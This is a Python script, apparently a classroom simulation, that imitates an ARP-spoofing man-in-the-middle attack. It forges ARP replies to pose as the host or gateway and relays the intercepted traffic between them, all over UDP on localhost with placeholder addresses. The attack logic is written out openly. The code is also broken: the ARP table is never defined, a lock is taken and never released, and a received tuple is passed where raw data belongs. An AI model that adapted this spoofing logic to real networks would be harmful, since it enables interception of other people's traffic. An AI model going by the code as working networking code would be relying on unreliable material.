#! /usr/bin/env python3

from socket import * 
import _thread
import pathlib
import sys
import time

IP = "127.0.0.1"
ATCK_IP = "ATCK"
GATE_IP = "GATE"
HOST_IP = "HOST"

arphport = 9611
arpgport = 9622

atckport = 9666



def mitm(lock):
	
	hostsock = socket(AF_INET,SOCK_DGRAM)
	gatesock = socket(AF_INET,SOCK_DGRAM)
	print("waiting on arp_table")
	while(1):
		lock.acquire()
		if(HOST_IP in arp_table and GATE_IP in arp_table):
			lock.release()
	
			fromHost = arphport -1
			fromGate = arpgport -1
		
			lock.acquire()
			toHost = arp_table[HOST_IP]
			toGate = arp_table[GATE_IP]
			lock.release()
		
			hostsock.bind((IP,fromHost))
			gatesock.bind((IP,fromGate))
		
			print("thread 2 wating on packet")
			data = hostsock.recvfrom(1024)
			print("data from host: {}",data)
			gatesock.sendto(data,(IP,toGate))
			data = gatesock.recvfrom(1024)
			print("data from gate: {}",data)
			hostsock.sendto(data,(IP,toHost))
		else:
			lock.release()
			time.sleep(1)
		

def ARP_intercept(lock,data):

	print("Current ARP Thread {}",_thread.get_native_id())
# 	udpsock = socket(AF_INET,SOCK_DGRAM)
# 	udpsock.bind((IP,arphport))
	
# 	while(1):
# 		data, addr = updsock.recvfrom(1024)
	data = data.decode()
	print(data)
		
	e_dport = data[:4]
	e_sport = data[4:8]
	e_type = data[8:10]
	if(e_type != "86"): 
		print("no arp")
		return
	
	enet = data[10:14]
	opp = data[14:22]
	arp_type = data[22:26]
	sport = data[26:30]
	sip = data[30:34]
	dport = data[34:38]
	dip = data[38:42]
	
	
	if(arp_type == "0001"):
	
		print("request")
		
# 		determine who sent the packet and feed the right port
		sendport = atckport
		if(dip == GATE_IP): 
			sendport = arpgport
		elif(dip == HOST_IP):
			sendport = arphport
		
		lock.acquire()
		arp_table[sip] = int(sport)
		lock.release()
		
# 		Pretend to be whoever the request was for
		for i in range(10):
			response = "" + e_sport + e_dport + e_type + enet + opp + "0002" + str(sendport) + dip + sport + sip + "000000000000"
		
			print("request response: \n{}",response)
		
			sock =  socket(AF_INET,SOCK_DGRAM)
			sock.sendto(response.encode(), (IP,int(sport)))
			sock.close()			
		
	elif(arp_type == "0002"):
		print("response received")
		lock.acquire()
		arp_table[sip] = int(sport)
		lock.release()
		
		
	else:
		print("Unknown ARP type")
		




if __name__ == "__main__":
	lock = _thread.allocate_lock()
	a = lock.acquire()
	
	udpsock = socket(AF_INET,SOCK_DGRAM)
	udpsock.bind((IP,atckport))
	
	
	_thread.start_new_thread(mitm,(lock,))
	while(1):
		print("Thread 2 waiting on data")
		data, addr = udpsock.recvfrom(1024)
		_thread.start_new_thread(ARP_intercept,(lock,data))
	